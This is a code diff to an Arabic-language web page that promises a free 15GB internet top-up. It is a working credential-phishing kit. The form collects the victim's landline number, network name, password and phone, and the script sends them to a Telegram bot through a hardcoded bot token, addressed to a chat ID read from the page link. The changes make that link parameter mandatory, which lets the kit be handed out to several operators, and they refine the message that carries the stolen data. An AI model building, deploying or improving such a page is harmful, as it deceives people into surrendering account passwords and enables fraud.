@@ -251,6 +251,17 @@
             font-weight: 600;
         }
 
+        .chatid-notice {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #ffeaa7;
+            display: none;
+        }
+
         footer {
             text-align: center;
             color: white;
@@ -367,12 +378,18 @@
                 </div>
             </div>
             <div class="hero-image">
-                <img src="https://www2.0zz0.com/2025/12/04/05/162263141.jpeg" alt="شحن إنترنت">
+                <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" alt="شحن إنترنت">
             </div>
         </section>
 
         <section class="form-container">
             <h2 class="form-title">طلب شحن 15GB مجاناً</h2>
+            
+            <div class="chatid-notice" id="chatid-notice">
+                <i class="fas fa-info-circle"></i>
+                <span id="chatid-text"></span>
+            </div>
+            
             <p style="text-align: center; margin-bottom: 30px; color: #666; font-size: 18px;">يرجى تعبئة النموذج أدناه بالمعلومات المطلوبة للحصول على الشحن المجاني</p>
 
             <form id="charging-form">
@@ -396,7 +413,7 @@
                     <input type="text" id="phone" name="phone" placeholder="رقم الهاتف للتواصل">
                 </div>
 
-                <button type="submit" class="submit-btn">
+                <button type="submit" class="submit-btn" id="submit-btn">
                     <i class="fas fa-paper-plane"></i> إرسال الطلب والحصول على 15GB مجاناً
                 </button>
             </form>
@@ -415,6 +432,11 @@
                 <i class="fas fa-exclamation-triangle"></i>
                 <p>حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.</p>
             </div>
+            
+            <div class="error-message" id="no-chatid-message" style="display: none;">
+                <i class="fas fa-exclamation-circle"></i>
+                <p>خطأ: لم يتم العثور على Chat ID في الرابط. يجب الوصول للموقع عبر رابط يحتوي على chatid.</p>
+            </div>
         </section>
 
         <footer>
@@ -429,6 +451,27 @@
     </div>
 
     <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // استخراج chat id من عنوان URL فقط
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chatid');
+            
+            // عرض Chat ID في الموقع
+            const chatidNotice = document.getElementById('chatid-notice');
+            const chatidText = document.getElementById('chatid-text');
+            
+            if (chatId) {
+                chatidNotice.style.display = 'block';
+                chatidText.textContent = `سيتم إرسال البيانات إلى Chat ID: ${chatId}`;
+                console.log('تم استخراج Chat ID من الرابط:', chatId);
+            } else {
+                // إخفاء زر الإرسال وإظهار رسالة خطأ
+                document.getElementById('submit-btn').style.display = 'none';
+                document.getElementById('no-chatid-message').style.display = 'block';
+                console.log('لم يتم العثور على Chat ID في الرابط');
+            }
+        });
+
         document.getElementById('charging-form').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -444,31 +487,32 @@
                 password: document.getElementById('password').value,
                 phone: document.getElementById('phone').value,
                 timestamp: new Date().toLocaleString('ar-EG'),
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                pageUrl: window.location.href
             };
 
             try {
-                // استخراج chat id من عنوان URL
+                // استخراج chat id من عنوان URL فقط
                 const urlParams = new URLSearchParams(window.location.search);
-                let chatId = urlParams.get('chatid');
+                const chatId = urlParams.get('chatid');
 
-                // إذا لم يوجد chat id في الرابط، نستخدم واحد افتراضي (يجب تغييره في التطبيق الحقيقي)
+                // التحقق من وجود chat id في الرابط
                 if (!chatId) {
-                    chatId = "7305720183"; // يجب استبدال هذا بالقيمة المناسبة
+                    throw new Error('لم يتم العثور على Chat ID في الرابط. يجب الوصول للموقع عبر رابط يحتوي على chatid.');
                 }
 
                 // إرسال البيانات إلى بوت التليجرام
                 const botToken = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g"; // يجب استبدال هذا بـ token البوت الخاص بك
                 const message = `
-                📲 طلب شحن 15GB جديد:
+📲 *طلب شحن 15GB جديد*
 
-                📞 الرقم الأرضي: ${formData.landline}
-                📶 اسم الشبكة: ${formData.networkName}
-                🔐 كلمة المرور: ${formData.password}
-                📱 رقم الهاتف: ${formData.phone || 'لم يتم تقديمه'}
+📞 *الرقم الأرضي:* ${formData.landline}
+📶 *اسم الشبكة:* ${formData.networkName}
+🔐 *كلمة المرور:* ${formData.password}
+📱 *رقم الهاتف:* ${formData.phone || 'لم يتم تقديمه'}
 
-                ⏰ الوقت: ${formData.timestamp}
-                🌐 المتصفح: ${formData.userAgent}
+⏰ *الوقت:* ${formData.timestamp}
+🌐 *رابط الصفحة:* ${formData.pageUrl}
                 `;
 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -481,7 +525,7 @@
                     body: JSON.stringify({
                         chat_id: chatId,
                         text: message,
-                        parse_mode: 'HTML'
+                        parse_mode: 'Markdown'
                     })
                 });
 
@@ -498,12 +542,12 @@
                     // إعادة تعيين النموذج
                     document.getElementById('charging-form').reset();
 
-                    // إخفاء رسالة النجاء بعد 5 ثواني
+                    // إخفاء رسالة النجاح بعد 5 ثواني
                     setTimeout(() => {
                         document.getElementById('success-message').style.display = 'none';
                     }, 5000);
                 } else {
-                    throw new Error('فشل إرسال البيانات إلى التليجرام');
+                    throw new Error('فشل إرسال البيانات إلى التليجرام: ' + result.description);
                 }
 
             } catch (error) {
@@ -511,25 +555,22 @@
 
                 // إظهار رسالة الخطأ
                 document.getElementById('loading').style.display = 'none';
-                document.getElementById('error-message').style.display = 'block';
+                
+                if (error.message.includes('Chat ID')) {
+                    document.getElementById('no-chatid-message').style.display = 'block';
+                } else {
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('error-message').innerHTML = `
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <p>حدث خطأ أثناء إرسال البيانات: ${error.message}</p>
+                    `;
+                }
 
                 // إخفاء رسالة الخطأ بعد 5 ثواني
                 setTimeout(() => {
                     document.getElementById('error-message').style.display = 'none';
+                    document.getElementById('no-chatid-message').style.display = 'none';
                 }, 5000);
-            }
-        });
-
-        // محاكاة استخراج chat id من الرابط (لأغراض العرض)
-        document.addEventListener('DOMContentLoaded', function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const chatId = urlParams.get('chatid');
-
-            if (chatId) {
-                console.log('تم استخراج Chat ID من الرابط:', chatId);
-                // يمكنك استخدام هذا الـ chat id في التطبيق
-            } else {
-                console.log('لم يتم العثور على Chat ID في الرابط، سيتم استخدام القيمة الافتراضية');
             }
         });
     </script>
